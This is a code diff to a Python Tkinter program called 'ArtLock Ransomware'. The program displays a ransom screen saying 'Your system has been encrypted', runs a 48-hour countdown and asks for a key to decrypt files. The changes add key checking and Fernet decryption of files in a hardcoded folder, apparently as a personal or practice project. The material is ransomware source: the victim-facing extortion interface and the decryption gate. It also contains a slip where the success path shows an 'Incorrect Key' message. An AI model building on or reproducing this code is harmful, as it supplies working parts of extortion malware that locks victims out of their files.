@@ -14,11 +14,7 @@ from termcolor import colored
 import allfiles1
 import signal
 
-def def_handler(sig, frame):
-    print(colored (f"\n[!] Saliendo...\n", "red"))
-    sys.exit(1)
 
-signal.signal(signal.SIGINT, def_handler)
 
 root = tk.Tk()
 root.title("ArtRansomware Interfaces")
@@ -30,21 +26,45 @@ base_directory = r"C:\Users\Lenovo\OneDrive\Desktop\encrypt"
 allfiles1.searching_files(base_directory)
 files = allfiles1.file_list
 
+def def_handler(sig, frame):
+    print(colored (f"\n[!] Saliendo...\n", "red"))
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+def on_focus_in(event):
+    val_key_entry.focus_set()
+
 def return_key():
     return open('key.key', 'rb').read()
 
 
 
-def file_decrypt(files, key):
-    fernet = Fernet(key)
-    for filepath in files:
-        with open(filepath, "rb") as file:
-            data_to_decrypt = file.read()
-        data = fernet.decrypt(data_to_decrypt)
+def file_decrypt():
 
-        with open(filepath, "wb") as file:
-            file.write(data)
+    insert_key = val_key_entry.get()
+    true_key = return_key()
+    fernet = Fernet(true_key)
+    true_key_dec= true_key.decode('utf-8')
 
+    if insert_key == true_key_dec:
+        try:
+            for filepath in files:
+                with open(filepath, "rb") as file:
+                    data_to_decrypt = file.read()
+                data = fernet.decrypt(data_to_decrypt)
+
+                with open(filepath, "wb") as file:
+                    file.write(data)
+            print(colored(f"\n[!] All your files have been restored", "green"))
+            MessageBox.showinfo("Alert", "[*] Incorrect Key")
+            root.destroy()
+        except Exception as e:
+            pass
+    else:
+        print(colored (f"\n[!] Incorret key", "red"))
+        MessageBox.showinfo("Alert", "[*] Incorrect Key")
+        key_entry.set("")
 def start_timer(countdown):
     if countdown >= 0:
             hours, remainder = divmod(countdown, 3600)
@@ -70,18 +90,17 @@ frame1 = ttk.Frame(root, width= width, height=height/2)
 frame1.pack_propagate(False)
 
 #titulo
-titulo = ttk.Label(frame0, text="ArtLock Ransomware", font=("sans-serif", 50, "normal"))
-titulo.place(relx=0.5, y=25, anchor="center")
-titulo.config(foreground='white', background='black')
+title = ttk.Label(frame0, text="ArtLock Ransomware", font=("sans-serif", 50, "normal"))
+title.place(relx=0.5, y=25, anchor="center")
+title.config(foreground='white', background='black')
 frame0.pack()
 #image
 image1 = Image.open("image.jpg")
 imageR = ImageTk.PhotoImage(image1)
 label1 = tk.Label(frame0, image = imageR, width=400, height=250)
 label1.image = imageR
-
-
 label1.place(relx=0.5, rely=0.5, anchor="center")
+
 # subtitle
 subtitle = ttk.Label(frame0, text="Your system has been encrypted", font=("sans-serif", 16, "normal"))
 subtitle.place(relx=0.5, rely=0.9, anchor="center")
@@ -89,12 +108,31 @@ subtitle.config(foreground='white', background='black')
 
 # key to decode
 
-new_entry = StringVar()
-nuevo_valor_entry = tk.Entry(frame0, textvariable=new_entry, width=70)
-nuevo_valor_entry.place(relx=0.52, rely=1, anchor="center")
+#key_entry = StringVar()
+#val_key_entry = tk.Entry(frame0, textvariable=key_entry, width=70)
+#val_key_entry.place(relx=0.52, rely=1, anchor="center")
+key_entry = tk.StringVar()
+#val_key_entry = tk.Entry(frame0, textvariable=key_entry, width=65, bg="white", fg="black", font=("Arial", 12), bd=2, insertwidth=2, insertbackground="black")
+val_key_entry = tk.Entry(
+    frame0,
+    textvariable=key_entry,
+    width=60,
+    bg="white",
+    fg="black",
+    font=("Arial", 12),
+    bd=2,
+    insertwidth=2,           # Grosor del cursor
+    insertbackground="black", # Color del cursor
+    highlightthickness=2,     # Grosor del borde cuando el Entry tiene foco
+    highlightcolor="blue"     # Color del borde cuando el Entry tiene foco
+)
 
-insert_key= tk.Label(frame0,text="Insert the key to decrypt all your files", fg="white", bg="black", font=("sans-serif",12 , "normal")).place(relx=0.4, rely=1, anchor="center")
-button_to_send_key = ttk.Button(frame0, text="Send").place(relx=0.7, rely=1, anchor="center")
+val_key_entry.focus()
+val_key_entry.icursor(tk.END)
+val_key_entry.place(relx=0.52, rely=1, anchor="center")
+
+insert_key= tk.Label(frame0,text="Insert the key to decrypt all your files", fg="white", bg="black", font=("sans-serif",12 , "normal")).place(relx=0.25, rely=1, anchor="center")
+button_to_send_key = ttk.Button(frame0, text="Send", command=file_decrypt).place(relx=0.74, rely=1, anchor="center")
 
 #frame 1
 ransom_message = """
@@ -135,5 +173,6 @@ start_timer(48 * 3600)
 frame0.pack()
 frame1.pack()
 
-
+root.bind("<FocusIn>", on_focus_in)
+root.bind('<Return>', file_decrypt)
 root.mainloop()
